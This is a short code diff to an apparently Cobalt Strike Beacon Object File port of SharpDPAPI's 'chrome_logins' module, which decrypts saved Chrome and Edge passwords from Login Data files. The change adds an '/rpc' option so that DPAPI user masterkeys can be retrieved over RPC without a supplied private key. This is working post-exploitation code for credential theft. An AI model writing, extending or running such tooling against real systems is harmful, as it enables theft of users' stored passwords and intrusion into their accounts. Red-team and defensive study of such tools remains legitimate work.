@@ -4,6 +4,7 @@
  * Usage:
  *   chrome_logins [/pvk:BASE64] [/credkey:KEY] [/server:SERVER]
  *                 [/target:PATH] [/unprotect] [/statekey:HEX]
+ *                 [/rpc]
  *
  * Decrypts Chrome/Edge saved passwords from Login Data files.
  */
@@ -23,6 +24,7 @@ void go(char* args, int args_len) {
     char* target_str  = BeaconDataExtract(&parser, NULL);
     char* statekey_hex = BeaconDataExtract(&parser, NULL);
     int   unprotect   = BeaconDataInt(&parser);
+    int   use_rpc     = BeaconDataInt(&parser);
 
     BYTE* pvk = NULL;
     int pvk_len = 0;
@@ -66,9 +68,9 @@ void go(char* args, int args_len) {
         }
     }
 
-    if (pvk) {
+    if (pvk || use_rpc) {
         triage_user_masterkeys(&cache, pvk, pvk_len,
-            NULL, NULL, NULL, FALSE, NULL, server, FALSE, NULL);
+            NULL, NULL, NULL, (BOOL)use_rpc, NULL, server, FALSE, NULL);
     }
 
     BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI Chrome Logins (BOF) ===\n");
